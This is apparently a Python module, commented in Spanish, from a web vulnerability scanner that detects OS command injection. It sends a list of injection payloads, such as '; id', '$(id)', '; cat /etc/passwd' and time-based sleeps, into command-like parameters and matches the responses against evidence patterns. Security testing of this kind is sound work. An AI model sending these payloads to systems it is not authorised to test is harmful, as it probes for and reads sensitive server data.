"""
Módulo de detección de Command Injection (OS Command Injection).
Detecta vulnerabilidades que permiten ejecutar comandos del sistema operativo.
"""

import requests
import re
import time
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
from core.base_module import VulnerabilityModule
from core.logger import get_logger
from datetime import datetime
import json
import os


class CommandInjectionModule(VulnerabilityModule):
    """
    Detecta vulnerabilidades de Command Injection (OS Command Injection).
    """
    
    # Payloads de Command Injection
    BASIC_PAYLOADS = [
        # Linux/Unix
        "; id",
        "| id",
        "& id",
        "&& id",
        "|| id",
        "`id`",
        "$(id)",
        "; whoami",
        "| whoami",
        "; uname -a",
        "; cat /etc/passwd",
        
        # Windows
        "& whoami",
        "&& whoami",
        "| whoami",
        "; dir",
        "& dir",
        "| dir",
        
        # Time-based detection
        "; sleep 5",
        "| sleep 5",
        "& timeout 5",
        "&& ping -c 5 127.0.0.1",
    ]
    
    # Patrones de evidencia de Command Injection
    CMDI_EVIDENCE_PATTERNS = [
        # Linux/Unix
        r'uid=\d+\(.*?\)',
        r'gid=\d+\(.*?\)',
        r'root:.*:0:0:',
        r'/bin/bash',
        r'/bin/sh',
        r'Linux.*?\d+\.\d+',
        r'Darwin',
        
        # Windows
        r'Volume in drive',
        r'Directory of',
        r'Windows',
        r'C:\\',
        r'<DIR>',
        
        # Comandos comunes
        r'total \d+',
        r'drwx',
        r'-rw-',
    ]

    def __init__(self, config):
        super().__init__(config)
        self.logger = get_logger("cmdi_module")
        self.target_url = config.get("target_url")
        self.findings = []
        self.tested_params = set()
        self.scan_timestamp = config.get("scan_timestamp", datetime.now().strftime("%Y%m%d_%H%M%S"))
        self.report_dir = config.get("report_dir", f"reports/scan_{self.scan_timestamp}")
        self.timeout = config.get("timeout", 10)

    def scan(self):
        """Ejecuta el escaneo completo de Command Injection."""
        self.logger.info(f"[CMDI] Iniciando escaneo de Command Injection en: {self.target_url}")
        
        try:
            # 1. Detectar puntos de inyección
            injection_points = self._discover_injection_points()
            
            if not injection_points:
                self.logger.warning("[CMDI] No se encontraron puntos de inyección")
                return
            
            self.logger.info(f"[CMDI] Encontrados {len(injection_points)} puntos de inyección")
            
            # 2. Probar Command Injection
            self._test_command_injection(injection_points)
            
            # 3. Exportar resultados
            self._export_results()
            
            # Resumen
            critical = len([f for f in self.findings if f["severity"] == "critical"])
            high = len([f for f in self.findings if f["severity"] == "high"])
            
            self.logger.info(f"[CMDI] Escaneo completado: {len(self.findings)} hallazgos")
            self.logger.info(f"[CMDI] Severidad: Critical={critical}, High={high}")
            
        except Exception as e:
            self.logger.error(f"[CMDI] Error inesperado: {e}")

    def _discover_injection_points(self):
        """Descubre parámetros susceptibles a Command Injection."""
        injection_points = []
        
        try:
            response = requests.get(self.target_url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # 1. Parámetros GET
            parsed = urlparse(self.target_url)
            if parsed.query:
                params = parse_qs(parsed.query)
                for param in params:
                    # Priorizar parámetros que probablemente ejecuten comandos
                    if any(keyword in param.lower() for keyword in ['cmd', 'command', 'exec', 'execute', 'run', 'ping', 'host', 'ip', 'file', 'path']):
                        injection_points.append({
                            'type': 'GET',
                            'url': self.target_url,
                            'param': param,
                            'method': 'GET'
                        })
            
            # 2. Formularios
            forms = soup.find_all('form')
            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'get').upper()
                action_url = urljoin(self.target_url, action) if action else self.target_url
                
                inputs = form.find_all(['input', 'textarea'])
                for inp in inputs:
                    name = inp.get('name')
                    if name and any(keyword in name.lower() for keyword in ['cmd', 'command', 'exec', 'execute', 'run', 'ping', 'host', 'ip', 'file', 'path']):
                        injection_points.append({
                            'type': 'FORM',
                            'url': action_url,
                            'param': name,
                            'method': method
                        })
            
            self.logger.info(f"[CMDI] Descubiertos {len(injection_points)} puntos de inyección")
            
        except Exception as e:
            self.logger.error(f"[CMDI] Error descubriendo puntos de inyección: {e}")
        
        return injection_points

    def _test_command_injection(self, injection_points):
        """Prueba Command Injection."""
        self.logger.info("[CMDI] Probando Command Injection...")
        
        for point in injection_points:
            param_key = f"{point['url']}:{point['param']}"
            if param_key in self.tested_params:
                continue
            
            self.tested_params.add(param_key)
            
            # Obtener respuesta baseline
            try:
                baseline_response = self._make_request(point, "test")
                baseline_text = baseline_response.text if baseline_response else ""
                baseline_time = baseline_response.elapsed.total_seconds() if baseline_response else 0
            except:
                continue
            
            for payload in self.BASIC_PAYLOADS:
                try:
                    start_time = time.time()
                    response = self._make_request(point, payload)
                    elapsed_time = time.time() - start_time
                    
                    if not response:
                        continue
                    
                    # Verificar evidencia de Command Injection
                    evidence = self._detect_cmdi_evidence(response.text, payload)
                    
                    # Detectar time-based injection
                    is_time_based = "sleep" in payload or "timeout" in payload or "ping" in payload
                    time_delay_detected = is_time_based and elapsed_time >= 4.5
                    
                    if evidence or time_delay_detected:
                        finding = {
                            "type": "command_injection",
                            "severity": "critical",
                            "title": f"Command Injection en parámetro '{point['param']}'",
                            "description": f"El parámetro '{point['param']}' es vulnerable a Command Injection. El servidor ejecuta comandos del sistema operativo controlados por el atacante.",
                            "cvss": 9.8,
                            "cwe": "CWE-78",
                            "owasp": "A03:2021 - Injection",
                            "recommendation": "Evitar ejecutar comandos del sistema con entrada del usuario. Si es necesario, usar funciones seguras con whitelist de comandos permitidos y escapar todos los caracteres especiales.",
                            "references": [
                                "https://owasp.org/www-community/attacks/Command_Injection",
                                "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
                                "https://portswigger.net/web-security/os-command-injection"
                            ],
                            "evidence": {
                                "url": point['url'],
                                "parameter": point['param'],
                                "method": point['method'],
                                "payload": payload,
                                "detection_method": "time-based" if time_delay_detected else "output-based",
                                "evidence_found": evidence if evidence else f"Time delay detected: {elapsed_time:.2f}s",
                                "response_snippet": self._get_context_snippet(response.text, evidence) if evidence else "N/A",
                                "vulnerable": True
                            }
                        }
                        
                        self.findings.append(finding)
                        self.logger.warning(f"[CMDI] Command Injection encontrado: {point['url']} (param: {point['param']})")
                        break
                    
                    time.sleep(0.2)
                    
                except Exception as e:
                    self.logger.debug(f"[CMDI] Error probando {point['param']}: {e}")

    def _make_request(self, point, payload):
        """Realiza una petición HTTP con el payload."""
        try:
            if point['method'] == 'GET':
                parsed = urlparse(point['url'])
                params = parse_qs(parsed.query)
                params[point['param']] = [payload]
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
                return requests.get(test_url, timeout=self.timeout, allow_redirects=True)
            
            else:  # POST
                data = {point['param']: payload}
                return requests.post(point['url'], data=data, timeout=self.timeout, allow_redirects=True)
        
        except Exception as e:
            self.logger.debug(f"[CMDI] Error en request: {e}")
            return None

    def _detect_cmdi_evidence(self, response_text, payload):
        """Detecta evidencia de Command Injection en la respuesta."""
        for pattern in self.CMDI_EVIDENCE_PATTERNS:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return match.group(0)
        return None

    def _get_context_snippet(self, text, evidence, context_size=150):
        """Obtiene un snippet del contexto donde aparece la evidencia."""
        try:
            if not evidence:
                return "Contexto no disponible"
            
            index = text.find(evidence)
            if index == -1:
                return "Evidencia encontrada (contexto no disponible)"
            
            start = max(0, index - context_size)
            end = min(len(text), index + len(evidence) + context_size)
            
            snippet = text[start:end]
            return f"...{snippet}..."
        except:
            return "Contexto no disponible"

    def _export_results(self):
        """Exporta los hallazgos a JSON."""
        try:
            os.makedirs(self.report_dir, exist_ok=True)
            
            output_data = {
                "scan_info": {
                    "target": self.target_url,
                    "timestamp": self.scan_timestamp,
                    "module": "command_injection",
                    "total_findings": len(self.findings),
                    "tested_parameters": len(self.tested_params)
                },
                "findings": self.findings,
                "summary": {
                    "critical": len([f for f in self.findings if f["severity"] == "critical"]),
                    "high": len([f for f in self.findings if f["severity"] == "high"]),
                    "medium": len([f for f in self.findings if f["severity"] == "medium"]),
                    "low": len([f for f in self.findings if f["severity"] == "low"])
                }
            }
            
            output_path = os.path.join(self.report_dir, "cmdi_findings.json")
            with open(output_path, "w", encoding="utf-8") as f:
                json.dump(output_data, f, indent=2, ensure_ascii=False)
            
            self.logger.info(f"[CMDI] Resultados exportados en: {output_path}")
            
        except Exception as e:
            self.logger.error(f"[CMDI] Error al exportar resultados: {e}")

    def get_results(self):
        """Devuelve los hallazgos encontrados."""
        return self.findings
